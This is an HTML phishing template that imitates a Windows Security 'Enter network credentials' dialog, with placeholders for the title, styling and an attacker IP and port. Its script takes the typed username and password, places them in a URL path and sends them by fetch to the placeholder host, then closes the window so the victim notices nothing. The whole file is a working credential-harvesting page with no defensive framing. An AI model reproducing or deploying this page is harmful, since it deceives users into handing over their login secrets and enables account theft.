<!DOCTYPE html>
<html lang="en">
<head>
<meta name="color-scheme" content="light dark">
<meta name="theme-color" content="REPLACE_WITH_THEME_COLOR">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REPLACE_WITH_TITLE</title>
<link rel="icon" REPLACE_WITH_FAVICON>
<style>
REPLACE_WITH_CSS
</style>
</head>
<body>
  <form id="credentialForm" class="dialog" onsubmit="return false;">
    <div class="dialog-body">
      <div class="title">Enter network credentials</div>
      <div class="subtitle">Windows Security</div>
      
      <div class="field">
        <label for="username">User name</label>
        <input type="text" id="username" name="username" autofocus>
      </div>
      <div class="field">
        <label for="password">Password</label>
        <input type="password" id="password" name="password">
      </div>
      
      <div class="remember">
        <input type="checkbox" id="remember" name="remember">
        <label for="remember">Remember my credentials</label>
      </div>
    </div>
    
    <div class="actions">
      <button type="submit" class="btn btn-ok">OK</button>
      <button type="button" id="cancelBtn" class="btn btn-cancel">Cancel</button>
    </div>
  </form>

  <script>
    const form = document.getElementById('credentialForm');
    
    async function handleLogin() {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      if (!username || !password) {
        alert('Please enter both username and password');
        return;
      }
      const url = `http://${REPLACE_WITH_IP}:${REPLACE_WITH_PORT}/${encodeURIComponent(username)}:${encodeURIComponent(password)}`;
      try {
        await fetch(url, {
          method: 'GET',
          mode: 'no-cors',
          cache: 'no-cache',
        });
        setTimeout(() => window.close(), 500);
      } catch (error) {
        setTimeout(() => window.close(), 800);
      }
    }

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      handleLogin();
    });
    document.getElementById('cancelBtn').addEventListener('click', () => {
      window.close();
    });
    document.addEventListener('keydown', (e) => {
      if (e.key === "Escape") window.close();
    });
  </script>
</body>
</html>
